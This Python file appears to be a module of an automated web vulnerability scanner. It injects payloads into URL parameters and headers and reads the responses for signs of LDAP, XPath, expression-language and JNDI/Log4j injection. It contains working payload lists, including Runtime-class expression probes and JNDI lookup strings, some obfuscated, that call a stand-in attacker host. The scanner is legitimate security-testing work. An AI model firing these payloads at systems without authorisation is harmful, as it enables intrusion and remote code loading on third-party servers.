"""Advanced injections: LDAP, XPath, HQL, EL/SpEL/OGNL, JNDI/Log4j."""
from core.http import get
from core.findings import Finding
from core.memory import log_event
import urllib.parse

LDAP_PAYLOADS = ["*", "admin*", "(|(uid=*))", ")(uid=*))(|(uid=*", "*)(uid=*))(|(uid=*"]
XPATH_PAYLOADS = ["' or '1'='1", "' or 1=1 or ''='", "x' or name()='username' or 'x'='y"]
HQL_PAYLOADS = ["' OR 1=1--", "' OR 'a'='a", "admin'--"]
EL_PAYLOADS = ["${7*7}", "#{7*7}", "${T(java.lang.Runtime).getRuntime()}", "#{T(java.lang.Runtime).getRuntime()}", "${''.getClass().forName('java.lang.Runtime')}", "${applicationScope}"]
JNDI_PAYLOADS = ["${jndi:ldap://attacker.example.com/a}", "${jndi:rmi://attacker.example.com/a}", "${jndi:dns://attacker.example.com}", "${${lower:j}ndi:${lower:l}dap://attacker.example.com/a}"]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    test_params = list(qs.keys()) if qs else []
    if not test_params:
        return findings
    for param in test_params:
        # LDAP
        for payload in LDAP_PAYLOADS:
            q = dict(qs); q[param] = [payload]
            r = get(parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl())
            if r.status != 0 and any(k in (r.text or "").lower() for k in ["ldap", "javax.naming", "invalid search filter", "bad search filter"]):
                findings.append(Finding(id=f"ldap-{hash(url+payload) & 0xffff:x}", target=parsed.netloc, type="LDAP Injection", severity="high", url=url, parameter=param, payload=payload, evidence="LDAP error", response_snippet=r.snippet(200), confidence=0.7))
                break
        # XPath
        for payload in XPATH_PAYLOADS:
            q = dict(qs); q[param] = [payload]
            r = get(parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl())
            if r.status != 0 and any(k in (r.text or "").lower() for k in ["xpath", "xpathexception", "invalid predicate", "xml"]):
                findings.append(Finding(id=f"xpath-{hash(url+payload) & 0xffff:x}", target=parsed.netloc, type="XPath Injection", severity="high", url=url, parameter=param, payload=payload, evidence="XPath error", response_snippet=r.snippet(200), confidence=0.7))
                break
        # EL / SpEL / OGNL
        for payload in EL_PAYLOADS:
            q = dict(qs); q[param] = [payload]
            r = get(parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl())
            if r.status != 0 and "49" in (r.text or ""):
                base_r = get(parsed._replace(query=urllib.parse.urlencode({k: v for k, v in qs.items()}, doseq=True)).geturl() if qs else parsed.geturl())
                if "49" not in (base_r.text or ""):
                    findings.append(Finding(id=f"el-{hash(url+payload) & 0xffff:x}", target=parsed.netloc, type="Expression Language Injection", severity="high", url=url, parameter=param, payload=payload, evidence="EL evaluated (7*7=49)", response_snippet=r.snippet(200), confidence=0.8))
                    break
        # JNDI / Log4j
        for payload in JNDI_PAYLOADS:
            q = dict(qs); q[param] = [payload]
            r = get(parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl())
            if r.status != 0:
                # heuristic: time delay or error
                if any(k in (r.text or "").lower() for k in ["javax.naming", "jndi", "log4j", "lookup"]):
                    findings.append(Finding(id=f"jndi-{hash(url+payload) & 0xffff:x}", target=parsed.netloc, type="JNDI/Log4j Injection", severity="critical", url=url, parameter=param, payload=payload, evidence="JNDI/Log4j indicator", response_snippet=r.snippet(200), confidence=0.6))
                    break
    # Header-based JNDI (User-Agent, X-Forwarded-For)
    for header in ["User-Agent", "X-Forwarded-For", "Referer", "X-Api-Version"]:
        for payload in JNDI_PAYLOADS[:2]:
            r = get(url, headers={header: payload})
            if r.status != 0 and any(k in (r.text or "").lower() for k in ["javax.naming", "jndi", "log4j"]):
                findings.append(Finding(id=f"jndi-hdr-{header}-{hash(url) & 0xffff:x}", target=parsed.netloc, type="JNDI/Log4j (header)", severity="critical", url=url, parameter=header, payload=payload, evidence=f"JNDI via {header}", response_snippet=r.snippet(200), confidence=0.6))
    log_event(parsed.netloc, "injection_advanced_scan", {"url": url, "findings": len(findings)})
    return findings
